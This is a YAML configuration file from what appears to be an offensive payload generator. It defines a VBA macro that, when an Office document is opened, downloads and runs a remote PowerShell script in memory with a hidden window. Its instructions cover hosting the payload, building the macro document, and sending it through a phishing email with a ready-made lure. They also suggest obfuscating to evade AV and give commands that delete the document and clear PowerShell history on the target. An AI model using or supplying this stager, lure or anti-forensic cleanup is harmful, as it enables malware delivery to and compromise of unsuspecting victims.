meta:
  name: "PowerShell Stager (VBA)"
  category: "Stager"
  description: |
    Simple PowerShell stager macro for Office documents.

    Features:
    - Downloads and executes remote PowerShell script via IEX
    - Uses WebClient.DownloadString for in-memory execution
    - Hidden window execution (vbHide)
    - Auto-execution via Document_Open/Workbook_Open and AutoOpen hooks
    - No disk artifacts (runs entirely in memory)

    This macro downloads a PowerShell script from a remote server and executes it
    in memory without writing to disk. Ideal for staging second-stage payloads.

    WARNING: For authorized security testing only!

  effectiveness: low

  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"

  artifacts:
    - "Office document with macros enabled"
    - "PowerShell process spawned by Office application"
    - "HTTP GET request to remote server"
    - "No disk-based payload artifacts (memory-only execution)"

parameters:
  - name: "lhost"
    type: "ip"
    description: "HTTP server IP address hosting the PowerShell script"
    required: true

  - name: "lport"
    type: "port"
    description: "HTTP server port"
    required: false
    default: 80

  - name: "remote_script_path"
    type: "string"
    description: "Path to PowerShell script on remote server (e.g., 'run.ps1' or 'payload/stager.ps1')"
    required: false
    default: "run.ps1"

  - name: "office_app"
    type: "choice"
    description: "Target Office application (determines auto-execution trigger)"
    required: false
    default: "word"
    choices: ["word", "excel"]

  - name: "output_file"
    type: "string"
    description: "Output VBA macro filename"
    required: false
    default: "stager.vba"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "stager/powershell_stager.vba"
  compile:
    enabled: false
  launch_instructions: |
    # Start HTTP Server

    Host your PowerShell payload on an HTTP server:

    ```bash
    python3 -m http.server {{ lport }}
    ```

    Ensure `{{ remote_script_path }}` is available at `http://{{ lhost }}:{{ lport }}/{{ remote_script_path }}`

    # Create Office Document

    1. Create new Word document
    2. Alt+F11 (VBA editor)
    3. Insert > Module
    4. Paste contents of {{ output_file }}
    5. Save as .docm (Macro-Enabled) or .doc (97-2003){% else %}1. Create new Excel workbook
    2. Alt+F11 (VBA editor)
    3. Insert > Module
    4. Paste contents of {{ output_file }}
    5. Save as .xlsm (Macro-Enabled) or .xls (97-2003){% endif %}

    # Transfer Document

    Via HTTP server:
    ```bash
    python3 -m http.server 80
    ```

    Or via phishing email attachment

    # Execute

    Macro auto-executes when document opened (if macros enabled) or user clicks "Enable Content" button

    # Notes

    - Stager downloads from: `http://{{ lhost }}:{{ lport }}/{{ remote_script_path }}`
    - Executes PowerShell with hidden window (`vbHide`)
    - Auto-executes via `Document_Open` or `Workbook_Open` and `Auto_Open` macros
    - No obfuscation or encryption (low effectiveness rating)
    - PowerShell command line visible in process tree
    - Network traffic to `{{ lhost }}:{{ lport }}` will be logged
    - No sandbox evasion techniques
    - Requires macros enabled in Office
    - Script execution policy may block PowerShell (typically bypassed by Office spawn)

    # Troubleshooting

    - **Macro doesn't run:** User must enable macros (Office security warning)
    - **No HTTP request:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
    - **PowerShell execution blocked:** Check Windows execution policy (typically not enforced for Office-spawned PowerShell)
    - **404 error:** Verify `{{ remote_script_path }}` exists on HTTP server
    - **Office Protected View:** User must click "Enable Editing" then "Enable Content"
    - **AV blocks macro:** VBA macros with PowerShell are heavily flagged; consider obfuscation
    - Check Office Trust Center settings if macros disabled
    - Verify HTTP server is accessible from target network

    # Macro Security Considerations

    - Target must have macros enabled or be willing to enable them
    - Recent Office versions show security warnings
    - Windows Defender often flags VBA macros spawning PowerShell
    - Consider obfuscating PowerShell command string
    - Network-based detection: HTTP request to external IP
    - PowerShell logging (Script Block Logging) may capture downloaded script

    # Alternative Delivery

    Embedded in email with social engineering:
    - **Subject:** "Quarterly Report - Action Required"
    - **Body:** "Please review the attached report and provide feedback by EOD."

    # Cleanup

    Delete document from target:

    ```powershell
    Remove-Item document.docm -Force
    ```

    Clear PowerShell history:

    ```powershell
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
    ```

    # Security Note

    This technique requires user interaction (opening document and enabling macros). Modern Office versions have macro protection enabled by default. The PowerShell command is NOT obfuscated and will be visible to EDR/AV. Consider this a proof-of-concept stager for authorized testing only.
